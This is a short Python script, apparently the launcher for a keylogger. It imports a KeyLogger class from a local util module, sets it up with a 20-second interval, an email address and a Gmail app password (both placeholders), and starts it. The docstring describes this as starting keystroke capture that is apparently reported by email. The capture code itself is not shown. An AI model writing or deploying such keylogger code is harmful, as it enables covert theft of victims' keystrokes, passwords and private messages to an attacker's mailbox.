"""
import KeyLogger class from util module and create an instance of it with the following parameters: 
time interval, email address, and google email key.
then starts the keylogger.
"""
from util import KeyLogger

keylogger = KeyLogger(20, "gmail.com", "app password")

keylogger.start()
